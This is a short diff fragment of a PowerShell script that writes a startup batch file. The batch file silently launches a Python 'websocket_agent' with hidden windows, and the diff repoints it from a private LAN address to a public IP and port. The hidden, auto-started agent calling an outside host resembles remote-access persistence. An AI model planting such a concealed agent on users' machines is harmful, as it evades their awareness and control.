@@ -24,7 +24,7 @@ $startupScriptContent = @"
 @echo off
 REM WebSocket Agent Startup Script
 cd /d "$currentDir"
-powershell -WindowStyle Hidden -Command "Start-Process python -ArgumentList 'websocket_agent.py', '192.168.129.23', '8888', 'test' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "Start-Process python -ArgumentList 'websocket_agent.py', '3.237.240.137', '3000', 'test' -WindowStyle Hidden"
 "@
 
 $startupScriptPath = Join-Path $currentDir "start_agent_startup.bat"
